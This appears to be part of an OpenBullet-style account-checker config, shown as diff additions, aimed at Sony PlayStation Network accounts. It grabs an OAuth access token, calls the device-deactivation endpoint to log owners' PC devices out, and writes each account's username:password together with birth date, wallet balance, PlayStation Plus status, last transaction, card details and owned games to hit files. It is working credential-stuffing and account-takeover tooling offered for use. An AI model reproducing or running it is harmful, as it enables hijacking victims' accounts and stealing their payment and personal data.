"https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?ui=pr&response_type=token&scope=openid%3Auser_id%20openid%3Aonline_id%20openid%3Actry_code%20openid%3Alang%20user%3Aaccount.communication.get%20kamaji%3Aget_account_hash%20oauth%3Amanage_user_auth_sessions%20openid%3Aacct_uuid%20user%3Aaccount.authentication.mode.get%20user%3Aaccount.authentication.mode.update%20oauth%3Amanage_backup_codes%20openid%3Aacct_id_str%20oauth%3Amanage_devicepasswords%20user%3Aaccount.phone.masked.get%20user%3Aaccount.notification.create%20user%3Aaccount.phone.create%20user%3Aaccount.phone.main.update%20user%3Aaccount.phone.delete%20openid%3Acontent_ctrl%20user%3Aaccount.changepassword.update%20user%3Aaccount.subaccounts.get%20openid%3Aage%20user%3Aaccount.graduate%20user%3AverifiedAccount.get%20kamaji%3Aaccount_link_user_link_account%20kamaji%3Aget_privacy_settings%20kamaji%3Aactivity_feed_get_feed_privacy%20kamaji%3Agame_list%20kamaji%3Aset_privacy_settings.gated%20kamaji%3Aactivity_feed_set_feed_privacy%20user%3Aaccount.communication.update.gated%20kamaji%3Akfs_images.upload%20kamaji%3Akfs_images.get%20kamaji%3Akfs_images.delete%20user%3Aaccount.communication.update%20user%3Aaccount.profile.get%20user%3Aaccount.profile.update%20kamaji%3Aget_internal_entitlements%20ias%3Aaccount.onlineIdChange.get%20user%3Aaccount.onlineId.get%20ias%3Aaccount.onlineIdChange.create.gated%20user%3AonlineIdSuggestion.get%20user%3Aaccount.myinvitations.get.gated%20user%3Aaccount.familyinvitationinvitee.update.gated%20user%3Aaccount.coppa.get%20user%3Aaccount.usage.tracking.get%20user%3Aoffline.account.usage.tracking.get%20wallets%3Ainstrument.get.gated%20wallets%3Apreference.get.gated%20user%3Aaccount.familymembers.role.update.gated%20user%3Aaccount.familymembers.get.gated%20user%3Aaccount.familymembers.parentalControls.update.gated%20user%3Aaccount.familymembers.password.update.gated%20user%3Aaccount.familymembers.delete.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.bedTime.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.wakeupTime.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.timezone.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.playTime.update.gated%20user%3Aaccount.familymembers.parentalControls.scheduleBased.overrides.create.gated%20user%3Aoffline.account.role.update.gated%20user%3Aoffline.account.get.gated%20user%3Aoffline.account.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.wakeupTime.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.bedTime.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.playTime.update.gated%20user%3Aoffline.account.parentalControls.scheduleBased.overrides.create.gated%20user%3Aoffline.account.parentalControls.scheduleBased.timezone.update.gated%20user%3Aaccount.familyinvitations.get.gated%20user%3Aaccount.familyinvitation.create.gated%20user%3Aaccount.familyinvitation.get.gated%20user%3Aaccount.familyinvitation.update.gated%20user%3Aaccount.coppa.validate.gated%20user%3Aaccount.identityMapper%20user%3Aaccount.email.create%20user%3Aaccount.emailVerification.get%20user%3Aaccount.address.create.gated%20user%3Aaccount.address.update.gated%20user%3Aaccount.address.get.gated%20user%3Aaccount.personal.get%20user%3Aaccount.personal.update.gated%20user%3Aaccount.tosua.update%20user%3Aaccount.languages.get%20user%3Aaccount.language.update.gated%20user%3Aaccount.pin.update.gated%20device%3Aget%20device%3Aupdate%20device%3Aactivate%20deviceManagement%3Adevices.deactivateAll&redirect_uri=https%3A%2F%2Fid.sonyentertainmentnetwork.com%2Fid%2Fmanagement%2F4ee55d12ad6394c135d6debc0b8d7c7968552523%2Fassets%2Fimplicit_complete.html&client_id=ce381e15-9cdd-4cf9-8384-0cf63db17f6a&state=526e64c5da30b212f35143982653dfd5&prompt=none&cid=2b1bf7f4-b8dd-42ab-ad91-2243e9936942&entry=device_management" AcceptEncoding=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+
+#CODEDEACTIVE PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "CODEDEACTIVE" 
+
+#DeactiveREQUEST REQUEST POST "https://dms.api.playstation.com/api/v2/devices/deactivate/me/all" AcceptEncoding=FALSE 
+  CONTENT "{\"deviceTypes\":[\"PCAPP\"]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Authorization: Bearer <CODEDEACTIVE>" 
+  HEADER "Accept-Language: en-GB, en; q=0.9, en-US; q=0.8" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/" 
+  HEADER "Origin: https://id.sonyentertainmentnetwork.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "Host: dms.api.playstation.com" 
+  HEADER "Content-Length: 25" 
+
+#CODEDEACTIVE PARSE "<SOURCE>" LR "\",\"description\":\"" "\"" -> VAR "DEACTIVE" 
+
+IF "<DEACTIVE>" Contains "blackout"
+
+FUNCTION Constant "NO" -> VAR "Deactive" 
+
+UTILITY File "WithOutDeactive.txt" Append "-------------------\\r\\n<USER>:<PASS>\\r\\n-------------------\\r\\nBrithDAte:<BRITDATE>\\r\\nDeactive : <Deactive>\\r\\nDeviceNameAndCount :<DeviceNameAndCount>\\r\\nCountry : <COUNTRY>\\r\\nWalletBalance : <WALLETBALANCE>\\r\\nPLUS: <PLUS>\\r\\nLASTTransaction : <LASTTRANSACTION>\\r\\nCARDS : <CARD> - YEARS : <CARDDATEYEAR> - Months : <CARDDATEMONTH>\\r\\n===============================<START GAMES DETAILS>=====================================\\r\\n<REPLACEGAME>\\r\\n===============================<END GAMES DETAILS>=======================================\\r\\n" 
+
+ELSE 
+
+FUNCTION Constant "YES" -> VAR "Deactive" 
+
+UTILITY File "WithDeactive.txt" Append "-------------------\\r\\n<USER>:<PASS>\\r\\n-------------------\\r\\nBrithDAte:<BRITDATE>\\r\\nDeactive : <Deactive>\\r\\nDeviceNameAndCount :<DeviceNameAndCount>\\r\\nCountry : <COUNTRY>\\r\\nWalletBalance : <WALLETBALANCE>\\r\\nPLUS: <PLUS>\\r\\nLASTTransaction : <LASTTRANSACTION>\\r\\nCARDS : <CARD> - YEARS : <CARDDATEYEAR> - Months : <CARDDATEMONTH>\\r\\n===============================<START GAMES DETAILS>=====================================\\r\\n<REPLACEGAME>\\r\\n===============================<END GAMES DETAILS>=======================================\\r\\n" 
+
+ENDIF
+
+UTILITY File "good.txt" Append "<USER>:<PASS>====\\r\\n" 
+
+FUNCTION ClearCookies "<COOKIES>" 
+
+BROWSERACTION ClearCookies "<COOKIES>" 
+
+BROWSERACTION Quit 
+
